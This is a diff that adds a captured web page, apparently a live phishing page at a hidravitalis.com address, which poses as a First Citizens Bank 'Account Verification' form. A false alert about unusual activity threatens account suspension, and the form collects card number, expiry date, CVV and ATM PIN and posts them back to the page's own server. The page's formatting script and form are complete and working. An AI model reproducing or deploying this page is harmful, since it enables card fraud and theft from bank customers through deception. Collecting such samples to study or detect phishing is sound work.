@@ -1,0 +1,164 @@
+<!-- url: https://fs.hidravitalis.com/auth.php
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Account Verification</title>
+    <link rel="icon" href="img/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Open Sans', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #b8c0c9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .auth-container {
+            width: 600px;
+            background-color: #f5f5f5;
+            border-radius: 2px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo-container {
+            padding: 30px;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+            background-color: white;
+        }
+        
+        .logo-container img {
+            height: 90px;
+        }
+        
+        .form-container {
+            padding: 30px 120px 30px;
+            background-color: #f5f5f5;
+        }
+        
+        .alert-message {
+            text-align: center;
+            color: #721c24;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 15px;
+            border-radius: 2px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            color: #333;
+        }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 2px;
+            font-size: 16px;
+            background-color: white;
+        }
+        
+        .input-group {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .input-group .form-group {
+            flex: 1;
+        }
+        
+        .verify-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4e5d6c;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="logo-container">
+            <img src="img/logo.png" alt="FirstCitizensBank Logo">
+        </div>
+        <div class="form-container">
+            <div class="alert-message">
+                IMPORTANT: We have detected unusual activity in your account. For your security, we need to verify your identity to prevent unauthorized access. Failure to complete this verification may result in immediate account suspension.
+            </div>
+            <form action="/auth.php" method="post">
+                <div class="form-group">
+                    <label for="card-number">Card Number</label>
+                    <input type="text" id="card-number" name="card-number" maxlength="19" placeholder="xxxx xxxx xxxx xxxx" required>
+                </div>
+                <div class="input-group">
+                    <div class="form-group">
+                        <label for="exp-date">Expiration Date</label>
+                        <input type="text" id="exp-date" name="exp-date" maxlength="5" placeholder="MM/YY" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="password" id="cvv" name="cvv" maxlength="3" placeholder="xxx" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="atm-pin">ATM PIN</label>
+                    <input type="password" id="atm-pin" name="atm-pin" maxlength="4" placeholder="xxxx" required>
+                </div>
+                <button type="submit" class="verify-btn">Verify Identity</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Format card number input with spaces
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.replace(/(.{4})/g, '$1 ').trim();
+            e.target.value = value;
+        });
+
+        // Format expiration date
+        document.getElementById('exp-date').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.slice(0,2) + '/' + value.slice(2,4);
+            }
+            e.target.value = value;
+        });
+
+        // Only allow numbers in CVV and PIN
+        ['cvv', 'atm-pin'].forEach(id => {
+            document.getElementById(id).addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+        });
+    </script>
+</body>
+</html>
